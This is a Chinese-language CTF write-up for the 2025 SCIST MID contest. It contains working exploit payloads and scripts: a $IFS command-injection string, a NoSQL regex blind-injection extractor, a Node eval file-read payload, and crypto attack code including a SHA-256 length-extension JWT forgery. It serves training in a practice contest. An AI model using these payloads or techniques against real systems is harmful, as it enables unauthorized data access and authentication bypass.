---
title: 2025 SCIST MID CTF Writeup
tags:
  - 資安
  - CTF
  - TSCCTF
  - Writeup
categories:
  - 資安
  - CTF
abbrlink: 2
date: 2025-02-12 00:00:00
lang:
---

# SCIST MID CTF Writeup

![Image](https://i.imgur.com/I5lei4J.png)

我是 SCIST_31 \OwO/

<!--more-->

## Web

### dig-waf4

跟作業幾乎一樣，但多禁了一些東西，不過空格還是可以用 `$IFS` 代替，就成功ㄌ

payload: `more$IFS/*_*`

flag: `SCIST{command_injection_has_somany_combinations!}`

### Da Vinci Code online 🛜

要在三次內猜到一個 0-10000 中的一個數字，通靈了幾次沒成功只好去看 code 了

發現

```javascript
getSecretAnswer(command) {
    if (command === 'SHOW_ME_THE_ANSWER_PLZ') {
        return { status: 'secret', answer: this.answer };
    }
    return { status: 'error', message: 'Invalid command' };
}
```

```javascript
if (data.type === 'guess') {
    response = room.gameRoom.guess(data.number);
} else if (data.type === 'backdoor') {
    response = room.gameRoom.getSecretAnswer(data.command);
} else {
    response = { status: 'error', message: 'Invalid message type' };
}
```

所以就只要用 BurpSuit 修改 Websocket 的內容

```json
{"type":"backdoor","number":100,"command":"SHOW_ME_THE_ANSWER_PLZ"}
```

```json
{"status":"secret","answer":7586}
```

就能成功獲得 Flag 了～

flag: `SCIST{WC_5c1St_Sc0r3bo4rD_1s5u3}`

### nosql injection blind2

跟作業的 nosql injection 一樣，但每個字的 range 變大了 (\u0000 ~ \uFFFF)，因為之前 code 就是用二分搜，所以基本上就改一點點就能得到 Flag ㄌ

```python
import requests
import string
import re

# 設定目標 URL
url = "http://lab.scist.org:31601/login"

# 初始 flag
extracted_flag = "SCIST"

# 字符集
# 添加 Unicode 字符集
charset = list("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{}") + [chr(i) for i in range(168, 0xFFFF + 1) if chr(i).isprintable()]

# 將字符集中的每個字元進行正則表達式轉義
escaped_charset = "".join(re.escape(char) for char in charset)

# 布林查詢函數
def test_payload(payload):
    headers = {"Content-Type": "application/json"}
    data = {
        "username": "admin",
        "password": {"$regex": payload},
    }
    response = requests.post(url, json=data, headers=headers)
    return "Login successful" in response.text

# 使用二分搜尋法來測試某位置的字符
def binary_search_for_char(base_flag, charset):
    low, high = 0, len(charset) - 1
    while low <= high:
        mid = (low + high) // 2
        char_to_test = charset[mid]
        payload = f"^{base_flag}{char_to_test}"
        if test_payload(payload):
            # 字符符合條件，表示在目前的範圍內
            return char_to_test
        else:
            # 如果字元不在範圍內，調整範圍
            if (high - low > 15000): # 發現 regex 用 [] 的範圍好像差不多只有 15000 個字元
                flag = False
                idx = low
                while idx < high:
                    idx = min(idx + 15000, high)
                    flag = flag or test_payload(f"^{base_flag}[{"".join(charset[low:idx])}]")
                if flag:
                    high = mid - 1
                else:
                    low = mid + 1
            else:
                payload = f"^{base_flag}[{"".join(charset[low:mid])}]"
                if test_payload(payload):
                    high = mid - 1
                else:
                    low = mid + 1
    return None

# 開始盲注
print("[+] Extracting flag...")
while not extracted_flag.endswith("}"):
    char = binary_search_for_char(extracted_flag, escaped_charset)
    if char:
        extracted_flag += char
        print(f"[+] Current flag: {extracted_flag}")
    else:
        print("[!] No matching character found. Check charset or logic.")
        break

print(f"[+] Final flag: {extracted_flag}")
```

flag: `SCIST{WOW_y0u_4r3_7h3_ＢＬＩＮＤ}`

### calculator

看了一下程式碼，發現在 server.js 有一個 eval，所以就可以直接注入，並發現 dockerfile 裡面有寫 flag 的名稱，就得到 flag ㄌ

```javascript
wss.on('connection', (ws) => {
  ws.on('message', (message) => {
    console.log('Received:', message);
    try {
      let result = eval('(' + message + ')');
      ws.send(result);
    } catch (e) {
      ws.send(e.message);
    }
  });
});
```

```dockerfile
COPY flag_3298fh9u32niaergjfwe9ij923.txt /
```

payload: `(() => require("fs").readFileSync("/flag_3298fh9u32niaergjfwe9ij923.txt", "utf8"))()`

flag: `SCIST{TRy_70_dO_5Om3_C@1cU1A7Or}`

## Misc

### Trick or Treat

這題是一個 nim game，可以用 nim sum 來解，就寫個 script 輕鬆得到 flag

```python solve.py
from pwn import *

def compute_move(state):
    nim_sum = 0
    for candies in state:
        nim_sum ^= candies
    for i, candies in enumerate(state):
        target = candies ^ nim_sum
        if target < candies:
            remove = candies - target
            return i + 1, remove
    # 沒有必勝移動時，從第一個非空箱子拿 1 顆
    for i, candies in enumerate(state):
        if candies > 0:
            return i + 1, 1
    return 1, 1


# 連線到遠端伺服器（請根據實際伺服器位址與 port 修改）
io = remote("lab.scist.org", 31418)
print("HELLO")
for i in range(100):
    print(io.recvuntil(b'boxes, each contains '))
    st = io.recvuntil(b'c').decode().strip('c').split(', ')
    st = [int(x) for x in st]
    while (sum(st) > 0):
        print("Current state:", st)
        out = compute_move(st)
        io.recvuntil(b"It's your turn, entering (n, k) denotes to take k candy from the box n: ")
        io.sendline(str(out).encode())
        st[out[0] - 1] -= out[1]
        io.recvline()
        if io.recvuntil(b' ').decode() == 'Mission ':
            break
        io.recvuntil(b'I take ')
        robot_take = int(io.recvuntil(b' ').decode())
        io.recvuntil(b'box ')
        robot_box = int (io.recvuntil(b'.').decode()[:-1])
        st[robot_box - 1] -= robot_take
io.interactive()
```

flag: `SCIST{trick-or-treat? trick-xor-treat!}`

## Crypto

### Elgamal oracle - 首殺 \owo/

是個白箱，看看是怎麼加密的

```python server.py
import itertools
import json
import sys
import typing

from Crypto.Random.random import randrange
from Crypto.Util.number import bytes_to_long, getPrime, isPrime, long_to_bytes

from secret import FLAG


class ElGamal:
    def __init__(self, nbit: int = 1024):
        self.nbyte = nbit // 8
        self.p = getPrime(nbit)
        self.g = self.gen_generator()
        self.x = randrange(2, self.p - 2)
        self.y = pow(self.g, self.x, self.p)

    def gen_generator(self) -> int:
        for g in self.gen_prime():
            if pow(g, (self.p - 1) // 2, self.p) == self.p - 1:
                return g

        raise ValueError("It's impossible to get here.")

    @staticmethod
    def gen_prime() -> typing.Generator[int, None, None]:
        yield from (2, 3)
        for k in itertools.count(5, 6):
            if isPrime(k):
                yield k
            if isPrime(k + 2):
                yield k + 2

    @property
    def public_key(self) -> str:
        return json.dumps({"g": self.g, "y": self.y, "p": self.p})

    def encrypt(self, plaintext: bytes) -> bytes:
        m = bytes_to_long(plaintext)
        assert 0 < m < self.p
        k = randrange(2, self.p - 2)
        c1 = pow(self.g, k, self.p)
        c2 = m * pow(self.y, k, self.p) % self.p
        return b"".join(
            c.to_bytes(self.nbyte, byteorder="big")
            for c in (c1, c2)
        )

    def decrypt(self, ciphertext: bytes) -> bytes:
        assert len(ciphertext) == 2 * self.nbyte
        c1, c2 = tuple(
            int.from_bytes(ciphertext[idx:idx+self.nbyte], byteorder="big")
            for idx in range(0, len(ciphertext), self.nbyte)
        )
        m = pow(c1, -self.x, self.p) * c2 % self.p
        return long_to_bytes(m)


def read_server():
    with open("./server.py", "r", encoding="utf-8") as file:
        print(file.read())


def main():
    cipher = ElGamal()
    print(f"public_key: {cipher.public_key}")
    print(f"flag: {cipher.encrypt(FLAG.encode()).hex()}")
    for _ in range(cipher.nbyte):
        print("> decrypt")
        print("> server.py")
        print("> exit")
        cmd = input("> Command: ")
        if cmd == "exit":
            sys.exit()
        elif cmd == "decrypt":
            ciphertext = bytes.fromhex(input("> Enter ciphertext: "))
            print(f"plaintext last byte: {cipher.decrypt(ciphertext)[-1]}")
        elif cmd == "server.py":
            read_server()
        else:
            print("Bad hacker")


if __name__ == "__main__":
    try:
        main()
    except EOFError:
        sys.exit(1)
```

每次只會給 ciphertext 解密後的最後一個 byte，試著運用 homomorphic 來解這題

$c2 \cdot k \mod p = m \cdot k \mod p$

我們每次可以得到

$m \mod 256$

希望可以迭代做到

$\lfloor \frac{m}{256}  \rfloor \mod 256 , \lfloor \frac{m}{256 ^ 2}  \rfloor \mod 256, \lfloor \frac{m}{256 ^ 3}  \rfloor \mod 256, \cdots$

想到可以用反模數來計算，令 $s \equiv 256^{-1} \mod p$

$$
\begin{align*}
\lfloor \frac{m}{256}  \rfloor \mod 256 &= (m - (m \mod 256)) \cdot s \mod p \mod 256 \\
&= (256 + ((m \cdot s \mod p \mod 256) - ((m \mod 256) \cdot s \mod p \mod 256))) \mod 256
\end{align*}
$$


就這樣不斷迭代就可以得到 flag ㄌ

```python solve.py
from pwn import *
import json

def main():
    conn = remote('lab.scist.org', 31415)
    # conn = process(['python3', 'server.py'])
    
    line = conn.recvline().decode().strip()
    public_key = json.loads(line.split(': ', 1)[1])
    p = public_key['p']
    g = public_key['g']
    y = public_key['y']
    
    line = conn.recvline().decode().strip()
    flag_hex = line.split(': ', 1)[1]
    flag_bytes = bytes.fromhex(flag_hex)
    nbyte = 128 
    c1_flag = int.from_bytes(flag_bytes[:nbyte], 'big')
    c2_flag = int.from_bytes(flag_bytes[nbyte:], 'big')
    m = 0
    
    s = pow(256, -1, p)
    
    bytes_list = []
    
    for i in range(128):

        ciphertext = c1_flag.to_bytes(nbyte, 'big') + (c2_flag % p).to_bytes(nbyte, 'big')

        conn.sendlineafter("> Command: ", "decrypt")
        conn.sendlineafter("> Enter ciphertext: ", ciphertext.hex())

        resp = conn.recvline().decode().strip()
        last_byte = int(resp.split(': ')[1])
        last_byte = (256 + (last_byte) - (m * pow(s, i) % p)) % 256
        m += last_byte * pow(256, i)
        bytes_list.append(last_byte)
        print(f"{i}: {chr(last_byte)}")
        c2_flag = (c2_flag * s)
    
    bytes_list.reverse()
    flag = bytes(bytes_list).decode(errors='replace')
    print("Flag:", flag)
    
    conn.close()

if __name__ == '__main__':
    main()
```

flag: `SCIST{I said elgamal can perform homomorphic encryption in class. :)}`

### LCG cipher - 首殺 \owo/

```python server.py
import abc
import copy
import sys
import typing

from Crypto.Util.number import getPrime

from secret import FLAG


class PRNG(abc.ABC):
    pass


class LCG(PRNG):
    def __init__(self, nbit: int = 128):
        self.nbyte = nbit // 8

        self.a = getPrime(nbit // 2)
        self.c = getPrime(nbit // 2)
        self.m = getPrime(nbit)
        self.seed = getPrime(nbit // 2)

    def next(self) -> typing.Generator[int, None, None]:
        while True:
            self.seed = (self.a * self.seed + self.c) % self.m
            yield from self.seed.to_bytes(self.nbyte, byteorder="big")


class Cipher:
    def __init__(self, rpng: PRNG):
        self.rpng = copy.copy(rpng)

    def encrypt(self, plaintext: bytes) -> bytes:
        return bytes(pt ^ key for pt, key in zip(plaintext, self.rpng.next()))


def read_server():
    with open("./server.py", "r", encoding="utf-8") as file:
        print(file.read())


def main():
    lcg = LCG()
    print(f"flag: {Cipher(lcg).encrypt(FLAG.encode()).hex()}")
    while True:
        print("> encrypt")
        print("> server.py")
        print("> exit")
        cmd = input("> Command: ")
        if cmd == "exit":
            sys.exit()
        elif cmd == "encrypt":
            plaintext = input("> Enter plaintext: ")
            print(f"enc: {Cipher(lcg).encrypt(plaintext.encode()).hex()}")
        elif cmd == "server.py":
            read_server()
        else:
            print("Bad hacker")


if __name__ == "__main__":
    try:
        main()
    except EOFError:
        sys.exit(1)
```

可以 byte by byte 的得到 flag，就一個個迭代就可以得到 flag ㄌ

```python solve.py
from pwn import *

# 伺服器資訊
HOST, PORT = "lab.scist.org", 31416

# 初始 flag 猜測
flag_guess = "SCIST{"
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&*()-=+}{[]:;\"'<>,.?/|\\`~ "


def get_encrypted_flag(conn):
    """ 取得加密的 flag """
    conn.recvuntil(b"flag: ")
    encrypted_flag = bytes.fromhex(conn.recvline().strip().decode())
    return encrypted_flag

def encrypt_known_plaintext(conn, plaintext):
    """ 加密已知明文，獲取 PRNG 產生的密鑰 """
    conn.sendlineafter(b"> Command: ", b"encrypt")
    conn.sendlineafter(b"> Enter plaintext: ", plaintext.encode())
    conn.recvuntil(b"enc: ")
    encrypted = bytes.fromhex(conn.recvline().strip().decode())
    return encrypted

def brute_force_flag():
    global flag_guess

    conn = remote(HOST, PORT)
    # conn = process(['python3', 'server.py'])
    
    # 取得密文 flag
    encrypted_flag = get_encrypted_flag(conn)
    print(f"[+] Encrypted Flag: {encrypted_flag.hex()}")

    # 嘗試逐字解密
    while True:
        found = False
        for char in charset:
            test_plaintext = flag_guess + char  # 測試當前猜測
            encrypted = encrypt_known_plaintext(conn, test_plaintext)  # 取得對應加密結果
            
            # XOR flag_guess 的部分，看看是否與 flag 相同
            if encrypted[:len(test_plaintext)] == encrypted_flag[:len(test_plaintext)]:
                flag_guess += char
                print(f"[+] Found: {flag_guess}")
                found = True
                break

        if not found or flag_guess.endswith("}"):  # 結束條件
            break

    print(f"[+] Final Flag: {flag_guess}")
    conn.close()

if __name__ == "__main__":
    brute_force_flag()
```

flag: `SCIST{using linear congruential generator to implement a stream cipher}`

### RS256 - 首殺 \owo/

```python server.py
import abc
import base64
import datetime
import hashlib
import json
import os
import sys

from Crypto.Random.random import randrange
from Crypto.Util.number import bytes_to_long, getPrime, inverse, isPrime, long_to_bytes, size

from secret import FLAG


class RsaKey:
    def __init__(self):
        p = self.get_forward_prime()
        q = self.get_backward_prime()
        self.n = p * q * (q + 2)
        self.e = 0x10001
        self.d = inverse(self.e, (p - 1) * (q ** 2 - 1))

    @staticmethod
    def get_forward_prime() -> int:
        while True:
            p = 2
            while size(p) < 527:
                p *= getPrime(randrange(4, 17))
            if isPrime(p + 1):
                return p + 1

    @staticmethod
    def get_backward_prime() -> int:
        while True:
            p = getPrime(240)
            if isPrime(p) and isPrime(p + 2):
                return p

    @property
    def public_key(self) -> str:
        return json.dumps({"e": self.e, "n": self.n})

    @property
    def private_key(self) -> str:
        return json.dumps({"d": self.d, "n": self.n})

    def sign(self, message: bytes) -> bytes:
        return long_to_bytes(pow(bytes_to_long(message), self.d, self.n))

    def verify(self, message: bytes, signature: bytes) -> bool:
        return message == long_to_bytes(pow(bytes_to_long(signature), self.e, self.n))


class JWT256(abc.ABC):
    def __init__(self, secret: bytes):
        self.secret = secret

    @property
    def alg(self) -> bytes:
        return self.__class__.__name__.encode()

    @property
    def exp(self) -> datetime.timedelta:
        return datetime.timedelta(minutes=1)

    @property
    def typ(self) -> bytes:
        return b"JWT256"

    @classmethod
    def base64encode(cls, data: bytes) -> str:
        data = base64.b64encode(data).decode()
        data = data.replace("+", "-").replace("/", "_")
        return data.rstrip("=")

    @classmethod
    def base64decode(cls, data: str) -> bytes:
        data = data.replace("-", "+").replace("_", "/")
        data = data + "=" * (-len(data) % 4)
        return base64.b64decode(data.encode())

    @classmethod
    def parse(cls, data: bytes) -> dict[bytes, bytes]:
        return dict(map(lambda item: item.split(b"=", 1), data.split(b"&")))

    @classmethod
    def unparse(cls, data: dict[bytes, bytes]) -> bytes:
        return b"&".join(map(b"=".join, data.items()))

    def encode(self, payload: dict[bytes, bytes]) -> str:
        header = self.generate_header()
        body = self.generate_body(payload)
        signature = self.generate_signature(header + b"." + body)
        return ".".join(self.base64encode(payload) for payload in (header, body, signature))

    def decode(self, token: str) -> dict[bytes, list[bytes]]:
        header, body, signature = tuple(self.base64decode(payload) for payload in token.split("."))
        self.verify_header(header)
        self.verify_body(body)
        self.verify_signature(header + b"." + body, signature)
        return self.parse(body)

    def generate_body(self, payload: dict[bytes, bytes]) -> bytes:
        payload[b"iat"] = f"{int(datetime.datetime.now().timestamp())}".encode()
        return self.unparse(payload)

    def generate_header(self) -> bytes:
        payload = {b"alg": self.alg, b"typ": self.typ}
        return self.unparse(payload)

    def generate_signature(self, message: bytes) -> bytes:
        return hashlib.sha256(self.secret + message).digest()

    def verify_body(self, body: bytes):
        issued_at = int(self.parse(body)[b"iat"].decode())
        if datetime.datetime.fromtimestamp(issued_at) + self.exp < datetime.datetime.now():
            raise ValueError("Verify body failed.")

    def verify_header(self, header: bytes):
        payload = self.parse(header)
        if not (self.alg == payload[b"alg"] and self.typ == payload[b"typ"]):
            raise ValueError("Verify header failed.")

    def verify_signature(self, message: bytes, signature: bytes):
        if self.generate_signature(message) != signature:
            raise ValueError("Verify signature failed.")


class RS256(JWT256):
    def __init__(self, secret: bytes, key: RsaKey):
        super().__init__(secret)
        self.key = key

    def generate_signature(self, message: bytes) -> str:
        return self.key.sign(super().generate_signature(message))

    def verify_signature(self, message: bytes, signature: bytes):
        if not self.key.verify(super().generate_signature(message), signature):
            raise ValueError("Verify signature failed.")


def read_server():
    with open("./server.py", "r", encoding="utf-8") as file:
        print(file.read())


def main():
    provider = RS256(os.urandom(randrange(37, 43)), RsaKey())
    print(f"public_key: {provider.key.public_key}")
    while True:
        print("> register")
        print("> login")
        print("> server.py")
        print("> exit")
        cmd = input("> Command: ")
        if cmd == "exit":
            sys.exit()
        elif cmd == "register":
            username = input("> Input username: ").strip()
            token = provider.encode({b"username": username.encode(), b"admin": b"N"})
            print(f"Hi {username}, your token is: {token}")
        elif cmd == "login":
            data = provider.decode(input("> Input token: ").strip())
            username = data[b"username"].decode()
            print(f"Hi {username}.")
            if data[b"admin"] == b"Y":
                print(f"Administrator can read the flag: {FLAG}")
        elif cmd == "server.py":
            read_server()
        else:
            print("Bad hacker")


if __name__ == "__main__":
    try:
        main()
    except ValueError:
        print("Login failed.")
    except EOFError:
        sys.exit(1)
```

這題超級麻煩，要構造一組 token 使得 JWT 驗證出來 header 正確， body 正確（在有效時間）， signature 正確，其中 signature 是把 header 和 body sha256 後再做一次 RSA 加密，不過原理倒是不難，因為 RSA `p-1` 是 smooth 的，可以用 Pollard's p-1 factorization 攻擊，sha256 要 hash 的是 secret + {header + '.' + body} ，因為 prase 時後面如果有跟前面相同的鍵值會蓋掉前面的，所以就可以用 LEA 攻擊， 其中 `secret` 的長度只有可能是 37~43 就一直猜就會對了

```python solve.py
from Crypto.Util.number import GCD
import base64

def pollard(n: int) -> int:
    a, b = 2, 2
    while True:
        a = pow(a, b, n)
        p = GCD(a - 1, n)
        if 1 < p < n:
            return p
        b += 1

import gmpy2

def fermat(n: int) -> tuple[int, int]:
    a = gmpy2.isqrt(n) + 1
    b = a ** 2 - n
    while not gmpy2.iroot(b, 2)[1]:
        a += 1
        b = a ** 2 - n
    b = gmpy2.iroot(b, 2)[0]
    return (a + b, a - b)

from Crypto.Util.number import *

def new_encode(data):
    data = base64.b64encode(data).decode()
    data = data.replace("+", "-").replace("/", "_")
    return data.rstrip("=")

def new_decode(data):
    data = data.replace("-", "+").replace("_", "/")
    data = data + "=" * (-len(data) % 4)
    return base64.b64decode(data.encode())

n = int(input("n: "))

p = pollard(n)

print(f"p: {p}")

q, r = fermat(n//p)
phi = (p - 1) * (q - 1) * (r - 1)
e = 65537
d = pow(e, -1, phi)

print(f"d: {d}")

ori_token = input("ori_token: ").split(".")

ori_header = new_decode(ori_token[0])
ori_body = new_decode(ori_token[1])
ori_sig = new_decode(ori_token[2])
message = ori_header + b"." + ori_body
hash_ori = long_to_bytes(pow(bytes_to_long(ori_sig), e, n))

print(f"message: {message}")
print(f"ori_sig: {ori_sig}")
print(f"hash_ori: {hash_ori}")

secret_length = 39 # guess 37 ~ 43
append_data = b'&admin=Y&iat=1839001735'

###### LEA ######
import struct
import hashlib

def rightrotate(x, n):
    return ((x >> n) | (x << (32 - n))) & 0xffffffff

class SHA256:
    def __init__(self, state=None, count=0):
        """
        state: 8個 32 位元整數，表示 SHA256 的中間狀態
        count: 已處理的位元組數（不包含目前尚未處理的資料）
        """
        if state is None:
            # SHA256 的初始向量 IV
            self.h = [
                0x6a09e667,
                0xbb67ae85,
                0x3c6ef372,
                0xa54ff53a,
                0x510e527f,
                0x9b05688c,
                0x1f83d9ab,
                0x5be0cd19,
            ]
        else:
            self.h = state[:]  # 複製一份狀態
        self.unprocessed = b''
        self.message_byte_length = count

    def update(self, data):
        self.unprocessed += data
        self.message_byte_length += len(data)
        while len(self.unprocessed) >= 64:
            self._handle(self.unprocessed[:64])
            self.unprocessed = self.unprocessed[64:]

    def _handle(self, chunk):
        assert len(chunk) == 64
        w = list(struct.unpack('>16L', chunk))
        for i in range(16, 64):
            s0 = rightrotate(w[i-15], 7) ^ rightrotate(w[i-15], 18) ^ (w[i-15] >> 3)
            s1 = rightrotate(w[i-2], 17) ^ rightrotate(w[i-2], 19) ^ (w[i-2] >> 10)
            w.append((w[i-16] + s0 + w[i-7] + s1) & 0xffffffff)
        a, b, c, d, e, f, g, h_val = self.h
        k = [
            0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
            0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
            0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
            0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
            0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
            0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
            0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
            0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
            0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
            0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
            0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
            0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
            0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
            0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
            0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
            0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
        ]
        for i in range(64):
            s1 = rightrotate(e, 6) ^ rightrotate(e, 11) ^ rightrotate(e, 25)
            ch = (e & f) ^ ((~e) & g)
            temp1 = (h_val + s1 + ch + k[i] + w[i]) & 0xffffffff
            s0 = rightrotate(a, 2) ^ rightrotate(a, 13) ^ rightrotate(a, 22)
            maj = (a & b) ^ (a & c) ^ (b & c)
            temp2 = (s0 + maj) & 0xffffffff

            h_val = g
            g = f
            f = e
            e = (d + temp1) & 0xffffffff
            d = c
            c = b
            b = a
            a = (temp1 + temp2) & 0xffffffff
        self.h[0] = (self.h[0] + a) & 0xffffffff
        self.h[1] = (self.h[1] + b) & 0xffffffff
        self.h[2] = (self.h[2] + c) & 0xffffffff
        self.h[3] = (self.h[3] + d) & 0xffffffff
        self.h[4] = (self.h[4] + e) & 0xffffffff
        self.h[5] = (self.h[5] + f) & 0xffffffff
        self.h[6] = (self.h[6] + g) & 0xffffffff
        self.h[7] = (self.h[7] + h_val) & 0xffffffff

    def _padding(self):
        # 根據 SHA256 規範進行填充：先加上 0x80，再補 0x00 至長度 mod 64 為 56，最後加上 8 字節的位元長度
        ml = self.message_byte_length * 8
        pad = b'\x80'
        while (self.message_byte_length + len(pad)) % 64 != 56:
            pad += b'\x00'
        pad += struct.pack('>Q', ml)
        return pad

    def digest(self):
        # 暫存目前狀態
        h_backup = self.h[:]
        unprocessed_backup = self.unprocessed
        message_byte_length_backup = self.message_byte_length

        self.update(self._padding())
        result = b''.join(struct.pack('>I', h) for h in self.h)

        # 還原狀態
        self.h = h_backup
        self.unprocessed = unprocessed_backup
        self.message_byte_length = message_byte_length_backup

        return result


ml = secret_length + len(message)
glue_padding = b'\x80'
while (ml + len(glue_padding)) % 64 != 56:
    glue_padding += b'\x00'
glue_padding += (ml * 8).to_bytes(8, 'big')
print("Glue padding (hex):", glue_padding.hex())

new_message = message + glue_padding + append_data

print("New message:", new_message)

# 1. 使用自訂 SHA256 進行長度延展攻擊
# 初始已處理位元組數：secret + message + glue_padding
initial_count = secret_length + len(message) + len(glue_padding)
# 將原始 hash 轉換為初始狀態（8 個 32 位元整數）
h = [int.from_bytes(hash_ori[i*4:(i+1)*4], 'big') for i in range(8)]
sha = SHA256(state=h, count=initial_count)
sha.update(append_data)
new_hash_extension = sha.digest()
print("New hash (extension attack):", new_hash_extension)

new_sig = long_to_bytes(pow(bytes_to_long(new_hash_extension), d, n))

new_body = new_message.split(b".")[1]

print("token:" + new_encode(ori_header) + "." + new_encode(new_body) + "." + new_encode(new_sig))
```

![Image](https://i.imgur.com/JNBweOL.png)

flag: `SCIST{It's a bad practice to implement RS256 of JWT.}`

P.S. 為什麼找不到網路上可以用來解 sha256 LEA 的工具或是腳本啊啊啊，~~其實 LEA 那部份主要是詠唱出來的~~

## Welcome

### CATCH THE FLAG!

在首頁的 console 看到

![Image](https://i.imgur.com/Y91Vjo0.png)

到 `[robots.txt](https://mid.ctf.scist.org/robots.txt)` 看到

```plaintext
User-agent: *
Disallow: /admin
Disallow:/cnZjdmN2Y3ZfYWd2Yl9kaV9jem16Cg==
```

進到 `/cnZjdmN2Y3ZfYWd2Yl9kaV9jem16Cg==` 發現

```javascript
        flag.addEventListener("click", function() {
            alert("E.1O9_w3lc0mE}");
        });
```

找到第二段 flag `E.1O9_w3lc0mE}` ，就成功ㄌ

flag: `SCIST{c0Ns01E.1O9_w3lc0mE}`
